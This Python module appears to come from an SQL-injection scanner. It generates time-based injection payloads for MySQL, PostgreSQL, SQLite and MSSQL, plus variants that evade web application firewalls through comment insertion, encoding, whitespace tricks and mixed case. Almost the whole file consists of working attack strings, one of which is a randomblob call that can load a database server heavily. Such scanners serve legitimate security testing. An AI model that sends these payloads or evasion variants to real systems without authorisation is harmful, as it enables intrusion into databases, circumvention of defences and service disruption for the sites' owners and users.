#!/usr/bin/env python3
"""SQLi payload generation, encoding, and request variation helpers.

Extracted from SmartSQLiHunter to keep the facade lean.
All functions are pure helpers – no instance state, no service pattern.
"""

from typing import List


def generate_time_based_payloads(param_name: str) -> List[str]:
    """Generate database-specific time-based SQLi payloads."""
    base_value = "1"
    payloads: List[str] = []

    # MySQL/MariaDB
    mysql_payloads = [
        f"{param_name}={base_value}' AND SLEEP(3)-- -",
        f"{param_name}={base_value}' AND SLEEP(3)#",
        f"{param_name}={base_value} AND SLEEP(3)",  # 数値型
        f"{param_name}={base_value}' AND (SELECT * FROM (SELECT(SLEEP(3)))a)-- -",  # サブクエリ形式
        f"{param_name}={base_value}' AND IF(1=1, SLEEP(3), 0)-- -",  # 条件付き
        f"{param_name}={base_value}' AND BENCHMARK(1000000, MD5('test'))-- -",  # CPU負荷型
    ]

    # PostgreSQL
    pgsql_payloads = [
        f"{param_name}={base_value}' AND pg_sleep(3)-- -",
        f"{param_name}={base_value}' AND (SELECT pg_sleep(3))-- -",
        f"{param_name}={base_value} AND pg_sleep(3)",
        f"{param_name}={base_value}' AND CASE WHEN 1=1 THEN pg_sleep(3) ELSE pg_sleep(0) END-- -",
    ]

    # SQLite（limited support）
    sqlite_payloads = [
        f"{param_name}={base_value}' AND randomblob(1000000000)-- -",  # CPU負荷型
        f"{param_name}={base_value} AND randomblob(1000000000)",
    ]

    # MSSQL
    mssql_payloads = [
        f"{param_name}={base_value}' WAITFOR DELAY '0:0:3'-- -",
        f"{param_name}={base_value}; WAITFOR DELAY '0:0:3'-- -",
    ]

    payloads.extend(mysql_payloads)
    payloads.extend(pgsql_payloads)
    payloads.extend(sqlite_payloads)
    payloads.extend(mssql_payloads)

    return payloads


def generate_waf_evasion_payloads(param_name: str) -> List[str]:
    """Generate WAF evasion SQLi payloads with obfuscation techniques."""
    base_value = "1"
    payloads: List[str] = []

    # コメント挿入
    comment_payloads = [
        f"{param_name}={base_value}'/**/AND/**/SLEEP(3)-- -",
        f"{param_name}={base_value}'/*test*/AND/*test*/SLEEP(3)#",
        f"{param_name}={base_value}' AND /*!50000SLEEP*/(3)-- -",  # MySQLバージョンコメント
    ]

    # エンコーディング変換
    encoded_payloads = [
        f"{param_name}={base_value}'%20AND%20SLEEP(3)-- -",  # URLエンコード
        f"{param_name}={base_value}'+AND+SLEEP(3)-- -",  # +エンコード
    ]

    # 改行/タブ挿入
    whitespace_payloads = [
        f"{param_name}={base_value}'%0aAND%0aSLEEP(3)-- -",  # 改行
        f"{param_name}={base_value}'%09AND%09SLEEP(3)-- -",  # タブ
    ]

    # 大文字小文字混在
    case_payloads = [
        f"{param_name}={base_value}' AND sLeEp(3)-- -",
        f"{param_name}={base_value}' AND SlEeP(3)#",
    ]

    payloads.extend(comment_payloads)
    payloads.extend(encoded_payloads)
    payloads.extend(whitespace_payloads)
    payloads.extend(case_payloads)

    return payloads


def detect_payload_technique(payload: str) -> str:
    """Classify SQLi payload technique from its content."""
    p = payload.lower()
    if "sleep(" in p or "pg_sleep(" in p:
        return "time_based_sleep"
    elif "benchmark(" in p:
        return "time_based_benchmark"
    elif "randomblob(" in p:
        return "time_based_randomblob"
    elif "waitfor" in p:
        return "time_based_waitfor"
    elif "/**/" in p or "/*!" in p:
        return "waf_evasion_comment"
    elif "%20" in p or "%0a" in p:
        return "waf_evasion_encoding"
    else:
        return "basic"
